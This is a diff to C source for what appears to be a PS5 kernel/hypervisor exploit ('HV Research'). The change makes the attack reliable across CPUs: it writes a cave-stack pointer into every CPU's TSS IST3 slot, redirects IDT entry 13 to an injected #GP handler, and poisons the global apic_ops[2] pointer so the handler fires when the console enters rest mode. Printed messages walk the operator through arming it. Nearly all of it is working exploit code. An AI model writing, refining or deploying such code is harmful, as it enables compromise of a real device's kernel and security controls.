@@ -6249,7 +6249,9 @@ static void campaign_flatz_setup(void) {
         /* rep movsb */
         handler_code[hc++] = 0xF3; handler_code[hc++] = 0xA4;
 
-        /* 2. Restore IST3 (before apic_ops so rax ends up valid) */
+        /* 2. Restore IST3 on CPU 0 (before apic_ops so rax ends up valid).
+         *    Arming patches IST3 on all 16 CPUs; this only restores CPU 0.
+         *    Harmless: restored IDT[13] has IST=0, so IST3 is unused. */
 
         /* movabs $orig_ist3_value, %rax */
         handler_code[hc++] = 0x48; handler_code[hc++] = 0xB8;
@@ -6498,18 +6500,35 @@ static void campaign_flatz_setup(void) {
                 sleep(1);
             }
 
-            printf("\n[*] ARMING NOW — IDT[13] + IST3 + poison...\n");
+            printf("\n[*] ARMING NOW — IST3 (all CPUs) + IDT[13] + poison...\n");
             fflush(stdout);
 
-            /* ARM Step 1: Patch IDT[13] → KLD gp_handler */
+            /* ARM Step 1: Set IST3 → cave stack on ALL CPUs.
+             *
+             * CRITICAL: apic_ops[2] is global — any CPU can call xapic_mode().
+             * Each CPU has its own TSS (stride 0x68, 16 CPUs).  If we only
+             * patch CPU 0's IST3 and the #GP fires on another CPU, that CPU
+             * reads IST3=0 from its own TSS → pushes interrupt frame to
+             * address 0 → #PF → double fault → triple fault → panic.
+             *
+             * Patch ALL CPUs' IST3 FIRST (before IDT), so every CPU has a
+             * valid IST3 stack ready before the #GP handler is installed. */
+            #define TSS_STRIDE  0x68
+            #define NUM_CPUS    16
+            for (int cpu = 0; cpu < NUM_CPUS; cpu++) {
+                uint64_t cpu_ist3_dmap = g_dmap_base + tss_pa + cpu * TSS_STRIDE + 0x34;
+                kernel_copyin(&new_ist3, cpu_ist3_dmap, 8);
+            }
+            printf("[+] TSS IST3 → 0x%016lx on all %d CPUs (cave stack, 256 bytes)\n",
+                   (unsigned long)new_ist3, NUM_CPUS);
+
+            /* ARM Step 2: Patch IDT[13] → KLD gp_handler.
+             * IDT is shared across all CPUs — one write covers everyone.
+             * IST3 is already set on all CPUs, so if a spurious #GP fires
+             * between this write and Step 3, the handler has a valid stack. */
             kernel_copyin(new_idt13, idt13_dmap_addr, 16);
             printf("[+] IDT[13] → 0x%016lx (KLD gp_handler, IST=3)\n",
                    (unsigned long)ht);
-
-            /* ARM Step 2: Set IST3 → cave stack */
-            kernel_copyin(&new_ist3, ist3_dmap, 8);
-            printf("[+] TSS IST3 → 0x%016lx (cave stack, 256 bytes)\n",
-                   (unsigned long)new_ist3);
 
             /* ARM Step 3: Poison apic_ops[2] — non-canonical → #GP on call */
             kernel_copyin(&poisoned, g_dmap_base + ops_pa + 2 * 8, 8);
@@ -6526,8 +6545,8 @@ static void campaign_flatz_setup(void) {
                    (unsigned long)g_kmod_gp_handler);
             printf("[+]  Handler PA:   0x%lx\n", (unsigned long)gp_pa);
             printf("[+]  IDT[13]:      → KLD handler (IST=3)\n");
-            printf("[+]  IST3:         → cave stack at 0x%lx\n",
-                   (unsigned long)new_ist3);
+            printf("[+]  IST3:         → cave stack at 0x%lx (all %d CPUs)\n",
+                   (unsigned long)new_ist3, NUM_CPUS);
             printf("[+]  apic_ops[2]:  POISONED (0xdeb7 prefix)\n");
             printf("[+]  Cave KVA:     0x%lx  PA: 0x%lx\n",
                    (unsigned long)cave_kva, (unsigned long)cave_pa);
@@ -6545,6 +6564,11 @@ static void campaign_flatz_setup(void) {
             printf("[+]    3. Handler restores IDT[13] + apic_ops[2] + IST3\n");
             printf("[+]    4. iretq re-executes call with valid pointer\n");
             printf("[+]  System should continue normally after one-shot restore.\n");
+            printf("[+]\n");
+            printf("[+]  NOTE: The 'ARMED' notification may NOT appear if you\n");
+            printf("[+]  are already on the power options screen — PS5 system\n");
+            printf("[+]  overlays suppress notification popups.  The poison IS\n");
+            printf("[+]  armed once the countdown finishes.  Enter rest mode.\n");
 
             notify("[HV Research] ARMED! Enter rest mode NOW!");
         } else if (cave_npt_executable) {
@@ -6631,18 +6655,25 @@ static void campaign_flatz_setup(void) {
                 sleep(1);
             }
 
-            printf("\n[*] ARMING NOW — IDT[13] + IST3 + poison...\n");
+            printf("\n[*] ARMING NOW — IST3 (all CPUs) + IDT[13] + poison...\n");
             fflush(stdout);
 
-            /* ARM Step 1: Patch IDT[13] → inline handler */
+            /* ARM Step 1: Set IST3 → cave stack on ALL CPUs.
+             * Same rationale as KLD path — any CPU can call xapic_mode()
+             * and each CPU has its own TSS with its own IST3 field.
+             * Original IST3 is typically 0 (unused by FreeBSD), so an
+             * unpatched CPU would triple-fault on #GP delivery. */
+            for (int cpu = 0; cpu < NUM_CPUS; cpu++) {
+                uint64_t cpu_ist3_dmap = g_dmap_base + tss_pa + cpu * TSS_STRIDE + 0x34;
+                kernel_copyin(&new_ist3, cpu_ist3_dmap, 8);
+            }
+            printf("[+] TSS IST3 → 0x%016lx on all %d CPUs (cave stack, 256 bytes)\n",
+                   (unsigned long)new_ist3, NUM_CPUS);
+
+            /* ARM Step 2: Patch IDT[13] → inline handler */
             kernel_copyin(new_idt13, idt13_dmap_addr, 16);
             printf("[+] IDT[13] → 0x%016lx (inline handler, IST=3)\n",
                    (unsigned long)ht);
-
-            /* ARM Step 2: Set IST3 → cave stack */
-            kernel_copyin(&new_ist3, ist3_dmap, 8);
-            printf("[+] TSS IST3 → 0x%016lx (cave stack, 256 bytes)\n",
-                   (unsigned long)new_ist3);
 
             /* ARM Step 3: Poison apic_ops[2] — non-canonical → #GP on call */
             kernel_copyin(&poisoned, g_dmap_base + ops_pa + 2 * 8, 8);
@@ -6662,8 +6693,8 @@ static void campaign_flatz_setup(void) {
             printf("[+]  Cave KVA:     0x%lx  PA: 0x%lx\n",
                    (unsigned long)cave_kva, (unsigned long)cave_pa);
             printf("[+]  IDT[13]:      → inline handler (IST=3)\n");
-            printf("[+]  IST3:         → cave stack at 0x%lx\n",
-                   (unsigned long)new_ist3);
+            printf("[+]  IST3:         → cave stack at 0x%lx (all %d CPUs)\n",
+                   (unsigned long)new_ist3, NUM_CPUS);
             printf("[+]  apic_ops[2]:  POISONED (0xdeb7 prefix)\n");
             printf("[+]  Orig IST3:    0x%lx (will be restored by handler)\n",
                    (unsigned long)orig_ist3);
@@ -6679,6 +6710,11 @@ static void campaign_flatz_setup(void) {
             printf("[+]    3. Handler restores IDT[13] + apic_ops[2] + IST3\n");
             printf("[+]    4. iretq re-executes call with valid pointer\n");
             printf("[+]  System should continue normally after one-shot restore.\n");
+            printf("[+]\n");
+            printf("[+]  NOTE: The 'ARMED' notification may NOT appear if you\n");
+            printf("[+]  are already on the power options screen — PS5 system\n");
+            printf("[+]  overlays suppress notification popups.  The poison IS\n");
+            printf("[+]  armed once the countdown finishes.  Enter rest mode.\n");
 
             notify("[HV Research] ARMED! Enter rest mode NOW!");
         }
